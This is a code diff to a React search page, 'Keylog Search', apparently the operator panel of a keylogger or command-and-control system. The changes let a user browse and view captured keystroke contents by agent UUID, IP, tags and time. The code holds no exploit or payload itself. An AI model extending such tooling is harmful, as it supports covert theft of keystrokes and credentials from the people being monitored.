@@ -20,6 +20,7 @@ const Search = () => {
     const [results, setResults] = useState([]);
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState('');
+    const [activeContent, setActiveContent] = useState(null);
 
     const parseTags = (input) => {
         return input
@@ -67,11 +68,11 @@ const Search = () => {
         fetchResults(0);
     };
 
+    const hasNextPage = total === null ? results.length === limit : offset + limit < total;
+
     const handleNext = () => {
+        if (!hasNextPage) return;
         const next = offset + limit;
-        if (total !== null && next >= total) {
-            return;
-        }
         fetchResults(next);
     };
 
@@ -86,18 +87,65 @@ const Search = () => {
         }
         return tags.map((t, idx) => {
             const value = t.value ? `:${t.value}` : '';
+            const token = `${t.key}${value}`;
             return (
-                <span key={`${t.key}-${idx}`} className="tag-pill">
+                <button
+                    key={`${t.key}-${idx}`}
+                    type="button"
+                    className="tag-pill"
+                    onClick={() => addTagToken(token)}
+                    title="Add tag to search"
+                >
                     {t.key}{value}
-                </span>
+                </button>
             );
+        });
+    };
+
+    const addTagToken = (token) => {
+        const next = tagsInput
+            .split(',')
+            .map(t => t.trim())
+            .filter(Boolean);
+        if (!next.includes(token)) {
+            next.push(token);
+        }
+        setTagsInput(next.join(', '));
+    };
+
+    const openContent = (hit) => {
+        const src = hit?._source || {};
+        setActiveContent({
+            id: hit?._id || '',
+            contents: src.contents || '',
+            uuid: src.uuid || '',
+            ip: src.ip || '',
+            createdAt: src.created_at || ''
+        });
+    };
+
+    const closeContent = () => {
+        setActiveContent(null);
+    };
+
+    const formatTimestamp = (ts) => {
+        if (!ts) return '';
+        const date = new Date(ts);
+        if (Number.isNaN(date.getTime())) return ts;
+        return date.toLocaleString(undefined, {
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
         });
     };
 
     return (
         <div className="search-container">
             <div className="search-header">
-                <h1>Keylog Search</h1>
+                <h1>Keylog Search (Beta)</h1>
                 <p className="search-subtitle">Search contents, filter by UUID, IP, tags, and time range.</p>
             </div>
 
@@ -219,14 +267,23 @@ const Search = () => {
                                         const src = hit._source || {};
                                         return (
                                             <tr key={hit._id}>
-                                                <td>{src.created_at}</td>
+                                                <td>{formatTimestamp(src.created_at)}</td>
                                                 <td>
                                                     <Link className="uuid-link" to={`/agent?agt=${src.uuid}`}>
                                                         {src.uuid}
                                                     </Link>
                                                 </td>
                                                 <td>{src.ip}</td>
-                                                <td className="contents-cell">{src.contents}</td>
+                                                <td className="contents-cell">
+                                                    <div className="contents-preview">{src.contents}</div>
+                                                    <button
+                                                        type="button"
+                                                        className="contents-button"
+                                                        onClick={() => openContent(hit)}
+                                                    >
+                                                        View
+                                                    </button>
+                                                </td>
                                                 <td className="tags-cell">{renderTags(src.tags)}</td>
                                             </tr>
                                         );
@@ -238,9 +295,29 @@ const Search = () => {
                 </div>
                 <div className="pagination-controls">
                     <button onClick={handlePrev} disabled={offset === 0 || loading}>Prev</button>
-                    <button onClick={handleNext} disabled={loading}>Next</button>
+                    <button onClick={handleNext} disabled={loading || !hasNextPage}>Next</button>
                 </div>
             </div>
+            {activeContent && (
+                <div className="content-modal" onClick={closeContent}>
+                    <div className="content-modal-card" onClick={(e) => e.stopPropagation()}>
+                        <div className="content-modal-header">
+                            <div>
+                                <div className="content-modal-title">Keylog Contents</div>
+                                <div className="content-modal-meta">
+                                    <span>{formatTimestamp(activeContent.createdAt)}</span>
+                                    <span>{activeContent.ip}</span>
+                                    <span>{activeContent.uuid}</span>
+                                </div>
+                            </div>
+                            <button type="button" className="content-modal-close" onClick={closeContent}>
+                                Close
+                            </button>
+                        </div>
+                        <pre className="content-modal-body">{activeContent.contents}</pre>
+                    </div>
+                </div>
+            )}
         </div>
     );
 };
